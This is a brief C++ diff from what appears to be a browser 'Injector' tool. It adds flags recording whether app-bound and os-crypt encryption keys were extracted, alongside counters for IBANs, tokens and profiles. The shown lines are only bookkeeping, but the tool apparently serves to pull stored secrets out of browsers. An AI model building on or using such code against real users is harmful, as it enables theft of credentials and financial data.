@@ -18,7 +18,15 @@ namespace Injector {
         int ibans = 0;
         int tokens = 0;
         int profiles = 0;
-        bool noAbe = false;
+        bool noAbe = false;          // DEPRECATED: Kept for backward compatibility
+        bool hasAppKey = false;      // NEW: True if app-bound key was extracted
+        bool hasOsKey = false;       // NEW: True if os-crypt key was extracted
+        
+        // Helper method to check if any keys were found
+        bool keysFound() const { return hasAppKey || hasOsKey; }
+        
+        // Helper method to check if it's a dual-key system
+        bool isDualKey() const { return hasAppKey && hasOsKey; }
     };
 
     class PipeServer {
